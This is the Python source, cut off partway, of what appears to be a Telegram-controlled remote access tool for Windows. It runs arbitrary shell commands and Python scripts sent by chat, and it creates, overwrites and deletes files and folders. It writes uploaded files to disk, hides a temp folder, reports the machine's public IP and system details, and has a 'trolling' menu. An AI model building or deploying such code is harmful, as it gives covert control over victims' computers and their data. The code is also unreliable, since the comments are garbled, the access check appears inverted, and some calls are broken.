import os, pyautogui, subprocess, keyboard, psutil

from shutil import rmtree, disk_usage
from ctypes import windll
from telebot import types, TeleBot
from random import randint
from time import sleep
from platform import uname
from pygetwindow import getActiveWindowTitle
from http.client import HTTPConnection
from webbrowser import open as webopen
from datetime import datetime
from screen_brightness_control import set_brightness, get_brightness


#–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞
FAST_KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c", "ctrl+v", "ctrl+s"]  # –±—ã—Å—Ç—Ä—ã–µ –∫–ª–∞–≤–∏—à–∏ (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –º–µ–Ω—é –∫–ª–∞–≤–∏—à)
FAST_CMDS = ['tasklist', 'ping']  # –±—ã—Å—Ç—Ä—ã–µ –∫–æ–º–∞–Ω–¥—ã (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø—Ä–∏ –≤–≤–æ–¥–µ –∫–æ–º–∞–Ω–¥)
TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # —Å–∞–π—Ç—ã –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –≤ —Ç—Ä–æ–ª–ª–∏–Ω–≥–µ (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø—Ä–∏ —Ç—Ä–æ–ª–ª–∏–Ω–≥–µ –º–∞—Å—Å–æ–≤—ã–º –æ—Ç–∫—Ä—ã—Ç–∏–µ–º —Å–∞–π—Ç–æ–≤)

VERSION = '3.4'
TOKEN = ""
chat_id = 0
chat_idd = 0

SAMP_ROUTE = ""  # –û—Å—Ç–∞–≤—å—Ç–µ –ø—É—Å—Ç—ã–º, –µ—Å–ª–∏ –Ω–µ —Ö–æ—Ç–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–ø—É—Å–∫–∞ SAMP
RAKLITE_ROUTE = ""  # –û—Å—Ç–∞–≤—å—Ç–µ –ø—É—Å—Ç—ã–º, –µ—Å–ª–∏ –Ω–µ —Ö–æ—Ç–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–ø—É—Å–∫–∞ RakSamp Lite

bot = TeleBot(TOKEN, parse_mode=None)  #–¢–æ–∫–µ–Ω
pyautogui.FAILSAFE = False

#//////////////////////////////////////////////////////////
def make_temp_folder():    
    os.mkdir(r'C:\temp')
    kernel32 = windll.kernel32
    attr = kernel32.GetFileAttributesW(r'C:\temp')
    kernel32.SetFileAttributesW(r'C:\temp', attr | 2)
    return True


def is_access_denied(id: int):
    if (chat_id and chat_idd) != id: return False
    return True

#//////////////////////////////////////////////////////////
conn = HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")
ip = conn.getresponse().read()

total_mem, used_mem, free_mem = disk_usage('.')
gb = 10 ** 9
login = os.getlogin()
width, height = pyautogui.size()
oper = uname()
try: virtual_memory = psutil.virtual_memory()
except: virtual_memory = '–Ω–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏'

try: battery = psutil.sensors_battery()[0]
except: battery = '–Ω–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏'


@bot.message_handler(commands=['start'])
def start(message: types.Message):
    if is_access_denied(message.chat.id): return None
    return mainmenu(message)

def mainmenu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    item0=types.KeyboardButton("/start")
    item1=types.KeyboardButton("–ö–æ–Ω—Å–æ–ª—å")
    item2=types.KeyboardButton("–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ü–ö")
    item3=types.KeyboardButton("–§–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏")
    item4=types.KeyboardButton("–ö–ª–∞–≤–∏—à–∏")
    item5=types.KeyboardButton("–¢—Ä–æ–ª–ª–∏–Ω–≥")
    item6=types.KeyboardButton("SAMP —Ñ—É–Ω–∫—Ü–∏–∏")
    item7=types.KeyboardButton("–ú–µ–Ω—é –±–∏–Ω–¥–æ–≤")
    item8=types.KeyboardButton("–û—Å–æ–±—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏")
    markup.add(item0, item1, item2, item3, item4, item5, item6, item7, item8)
        
    bot.send_message(message.chat.id, '*üìå –í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_main)

def check_main(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–§–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏': return files_menu(message)
    elif message.text.strip() == '–ö–æ–Ω—Å–æ–ª—å': return console_menu(message)
    elif message.text.strip() == '–ö–ª–∞–≤–∏—à–∏': return keyboard_menu(message)
    elif message.text.strip() == '–ú–µ–Ω—é –±–∏–Ω–¥–æ–≤': return bind_menu(message)
    elif message.text.strip() == '–¢—Ä–æ–ª–ª–∏–Ω–≥': return packs(message)
    elif message.text.strip() == '–û—Å–æ–±—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏': return other_functions(message)
    elif message.text.strip() == 'SAMP —Ñ—É–Ω–∫—Ü–∏–∏': return samp_menu(message)
    elif message.text.strip() == '–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ü–ö': return pc_settings(message)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return mainmenu(message)


def console_commands(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return console_menu(message)
    elif message.text.strip() == '/start': return start(message)

    try:
        output=subprocess.getoutput(message.text.strip(), encoding='cp866')

        if len(output) > 1999:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder

            bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{message.text.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *—Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–º* –∏ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª –Ω–∏–∂–µ*!', parse_mode = "Markdown")
            my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
            my_file.write(output)
            my_file.close()
            bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
            os.remove('C:\\temp\\ConsoleOutput.txt')
            return bot.register_next_step_handler(message, console_commands)

        bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
        bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{message.text.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –≤—ã—à–µ', parse_mode = "Markdown")
        return bot.register_next_step_handler(message, console_commands)

    except:
        bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{message.text.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *–ø—É—Å—Ç–æ–π —Å—Ç—Ä–æ–∫–æ–π*!', parse_mode = "Markdown")
        return bot.register_next_step_handler(message, console_commands)


def python_scripts(message: types.Message):
    if is_access_denied(message.chat.id): return None

    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return console_menu(message)
    
    bot.send_message(message.chat.id, f'‚òëÔ∏è *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ "{message.text.strip()}" –±—ã–ª –∑–∞–ø—É—â–µ–Ω!*', parse_mode = "Markdown")
    console_menu(message)

    try:
        output=subprocess.getoutput(f'python {message.text.strip()}', encoding='cp866')
        bot.send_message(message.chat.id, f'‚òëÔ∏è *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ "{message.text.strip()}" –±—ã–ª —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!\n–õ–æ–≥ –Ω–∏–∂–µ*', parse_mode = "Markdown")
        return bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

    except: return bot.send_message(message.chat.id, f'‚ùå *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ {message.text.strip()} –Ω–µ –±—ã–ª –∑–∞–ø—É—â–µ–Ω –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏!*', parse_mode = "Markdown")


def create_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
        
    try:
        my_file = open(message.text.strip(), "w")
        my_file.close()
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, create_file_check, message.text.strip())

    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –º–µ—Å—Ç–∞*', parse_mode="Markdown")
        return files_menu(message)

def create_file_check(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None      
    
    if message.text.strip() == '/start': return start(message)

    with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
    bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!', parse_mode="Markdown")
    return files_menu(message)


def change_file_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    item0=types.KeyboardButton("–î–æ–±–∞–≤–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ")
    item1=types.KeyboardButton("–ü–æ–ª–Ω–æ—Å—Ç—å—é –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ")
    item2=types.KeyboardButton("–û—á–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª")
    item3=types.KeyboardButton("–ù–∞–∑–∞–¥")
    markup.add(item0, item1, item2, item3)

    bot.send_message(message.chat.id, '*‚úçÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ!*', reply_markup=markup, parse_mode="Markdown")
    return bot.register_next_step_handler(message, change_file_check)
    
def change_file_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == "–î–æ–±–∞–≤–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ": return add_in_file_content(message)
    elif message.text.strip() == "–û—á–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª": return clean_file(message)
    elif message.text.strip() == "–ü–æ–ª–Ω–æ—Å—Ç—å—é –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ": return change_file(message)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!* –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', parse_mode="Markdown")
    return change_file_menu(message)


def change_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=False, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞(–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–ø–∫–µ, –ø—Ä–æ—Å—Ç–æ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ)*', parse_mode="Markdown", reply_markup=markup)
    return bot.register_next_step_handler(message, change_file_new_content)

def change_file_new_content(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return change_file_menu(message)

    bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –Ω–æ–≤–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ!*', parse_mode="Markdown")
    return bot.register_next_step_handler(message, change_file_finish, message.text.strip())

def change_file_finish(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
    
    try:
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == '–ù–∞–∑–∞–¥': return change_file_menu(message)

        with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
        bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!', parse_mode="Markdown")
        return change_file_menu(message)

    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
        return change_file_menu(message)


def clean_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞(–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–ø–∫–µ, –ø—Ä–æ—Å—Ç–æ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ)*', parse_mode="Markdown", reply_markup=markup)
    return bot.register_next_step_handler(message, clean_file_check)

def clean_file_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return change_file_menu(message)

    try:
        with open(message.text.strip(), 'w+', encoding = 'utf-8') as file: file.write("")
        bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{message.text.strip()}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω!', parse_mode='Markdown')
        return change_file_menu(message)
    
    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
        return change_file_menu(message)


def add_in_file_content(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=False, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º –∏–ª–∏ –ø—É—Ç—å –¥–æ –Ω—É–∂–Ω–æ–≥–æ —Ñ–∞–π–ª–∞*', parse_mode='Markdown', reply_markup=markup)
    return bot.register_next_step_handler(message, add_in_file_text)

def add_in_file_text(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥':return change_file_menu(message)

    bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å!*', parse_mode='Markdown')
    return bot.register_next_step_handler(message, add_in_file_finish, message.text.strip())

def add_in_file_finish(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return change_file_menu(message)

    try:
        with open(route, 'w+', encoding='utf-8') as file: file.write(message.text.strip()) 
        bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω/–∏–∑–º–µ–Ω–µ–Ω!', parse_mode='Markdown')
        return change_file_menu(message)
    
    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode='Markdown')
        return change_file_menu(message)


def delete_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª"), types.KeyboardButton("–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É"), types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '‚úçÔ∏è *–í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_delete_menu)

def check_delete_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
    elif message.text.strip() == '–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É': return delete_folder(message)
    elif message.text.strip() == '–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª': return delete_file(message)
        
    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ', parse_mode='Markdown')
    return delete_menu(message)


def delete_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞–¥–æ —É–¥–∞–ª–∏—Ç—å (–ª–∏–±–æ –ø—Ä–æ—Å—Ç–æ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º, –µ—Å–ª–∏ –æ–Ω –≤ —Ç–µ–∫—É—â–µ–π –ø–∞–ø–∫–µ)!*', parse_mode='Markdown', reply_markup=markup)
    return bot.register_next_step_handler(message, delete_file_check)

def delete_file_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return delete_menu(message)

    try: os.remove(message.text.strip())
    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *—Ñ–∞–π–ª –Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ', parse_mode='Markdown')
        return delete_menu(message)
            
    bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª –ø–æ –ø—É—Ç–∏ *{message.text.strip()}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω!', parse_mode = "Markdown")
    return delete_menu(message)



def delete_folder(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ, –∫–æ—Ç–æ—Ä—É—é –Ω–∞–¥–æ —É–¥–∞–ª–∏—Ç—å!*', parse_mode='Markdown', reply_markup=markup)
    return bot.register_next_step_handler(message, delete_folder_check)

def delete_folder_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return delete_menu(message)
        
    try: rmtree(message.text.strip())
    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–ø–∞–ø–∫–∞ –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –∫ –Ω–µ–π –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', parse_mode='Markdown')
        return delete_menu(message)

    bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ *{message.text.strip()}* –±—ã–ª–∞ —É–¥–∞–ª–µ–Ω–∞!', parse_mode = "Markdown")
    return delete_menu(message)



def download_on_pc_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ"), types.KeyboardButton("–í—ã–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–µ"), types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '*‚öΩÔ∏è –í—ã –≤ –º–µ–Ω—é –≤—ã–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤!*', reply_markup=markup, parse_mode="Markdown")
    bot.register_next_step_handler(message, check_download_on_pc)

def check_download_on_pc(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤—ã–≥—Ä—É–∂–µ–Ω–Ω–æ–µ —Ñ–æ—Ç–æ\n(–ü—Ä–∏–º–µ—Ä: C:\\pon.jpg)*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, download_photo)

    elif message.text.strip() == '–í—ã–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–µ':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤—ã–≥—Ä—É–∂–µ–Ω–Ω—ã–π —Ñ–∞–π–ª\n(–ü—Ä–∏–º–µ—Ä: C:\\pon.txt)*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, download_file_on_pc)
        
    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!*\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ', parse_mode='Markdown')
    return download_on_pc_menu(message)


def download_file_on_pc(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return download_file_on_pc1(message)

    bot.send_message(message.chat.id, '*‚úçÔ∏è –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≥—Ä—É–∑–∏—Ç—å (–¥–æ 20 –º–±)*', parse_mode="Markdown")
    return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())

def download_file_on_pc1(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
        
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        with open(route, 'wb', encoding='utf-8') as new_file: new_file.write(downloaded_file)
        bot.send_message(message.chat.id, '*‚òëÔ∏è –£—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ!*', parse_mode="Markdown")
        return download_on_pc_menu(message)

    except:
        bot.send_message(message.chat.id, '*‚ùå –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ, –∏–ª–∏ —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º —Ç—è–∂–µ–ª—ã–π, –∏–ª–∏ —É–∫–∞–∑–∞–Ω–æ–≥–æ –ø—É—Ç–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
        return download_on_pc_menu(message)


def download_photo(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return download_file_on_pc1(message)

    bot.send_message(message.chat.id, '*‚úçÔ∏è –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≥—Ä—É–∑–∏—Ç—å (–¥–æ 20 –º–±)*', parse_mode="Markdown")
    return bot.register_next_step_handler(message, download_photo_on_pc, message.text.strip())

def download_photo_on_pc(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
    
    file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    try:
        with open(route, 'wb') as new_file: new_file.write(downloaded_file)
        bot.send_message(message.chat.id, '*‚òëÔ∏è –£—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ!*', parse_mode="Markdown")
        return download_on_pc_menu(message)
    
    except:
        bot.send_message(message.chat.id, '*‚ùå –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ, –∏–ª–∏ —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º —Ç—è–∂–µ–ª—ã–π, –∏–ª–∏ —É–∫–∞–∑–∞–Ω–æ–≥–æ –ø—É—Ç–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
        return download_on_pc_menu(message)


def files_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    item0=types.KeyboardButton("–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫")
    item1=types.KeyboardButton("–£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫")
